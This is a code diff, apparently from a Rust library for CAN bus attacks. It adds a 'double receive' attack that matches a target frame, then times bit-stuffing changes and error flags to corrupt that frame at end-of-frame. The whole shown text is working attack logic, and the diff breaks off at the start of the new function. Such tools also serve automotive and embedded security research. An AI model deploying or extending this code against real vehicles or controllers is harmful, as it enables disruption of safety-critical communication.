@@ -20,6 +20,11 @@ pub enum PredefAttacks {
         match_data: Vec<u8, 8>,
         errors: usize,
     },
+    DoubleReceiveAttack {
+        id: Id,
+        match_data: Vec<u8, 8>,
+        errors: usize,
+    },
 }
 
 impl<const OUT_SIZE: usize> Buildable<OUT_SIZE> for PredefAttacks {
@@ -41,6 +46,11 @@ impl<const OUT_SIZE: usize> Buildable<OUT_SIZE> for PredefAttacks {
                 ref match_data,
                 errors,
             } => self.build_bus_off_attack(out_vec, id, match_data, *errors),
+            PredefAttacks::DoubleReceiveAttack {
+                id,
+                ref match_data,
+                errors,
+            } => self.build_double_receive_attack(out_vec, id, match_data, *errors),
         }
     }
 }
@@ -124,6 +134,46 @@ impl PredefAttacks {
     }
 
     fn build_bus_off_attack<const SIZE: usize>(
+        &self,
+        hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
+        id: &Id,
+        match_data: &Vec<u8, 8>,
+        errors: usize,
+    ) -> Result<usize, BuildError> {
+        // Wait for the end of the frame
+        let attack_size = self
+            .build_match_id_and_data(hl_attack, id, match_data)
+            .unwrap();
+
+        // Skip CRC (15 bits)
+        hl_attack
+            .push(HighLevelAttackCmd::Wait { bits: 15 })
+            .unwrap();
+
+        // The last part of the message hasn't bitstuffing
+        hl_attack
+            .push(HighLevelAttackCmd::SetBitstuffing { state: false })
+            .unwrap();
+
+        // Wait until EOF1 ends (CRC Del, ACK, ACK Del, [EoF6 - EoF2])
+        hl_attack
+            .push(HighLevelAttackCmd::Wait { bits: 8 })
+            .unwrap();
+
+        // Enable bitstuffing again
+        hl_attack
+            .push(HighLevelAttackCmd::SetBitstuffing { state: true })
+            .unwrap();
+
+        // Send error to break the message
+        hl_attack
+            .push(HighLevelAttackCmd::SendError { count: errors })
+            .unwrap();
+
+        Ok(attack_size + 5)
+    }
+
+    fn build_double_receive_attack<const SIZE: usize>(
         &self,
         hl_attack: &mut Vec<HighLevelAttackCmd, SIZE>,
         id: &Id,
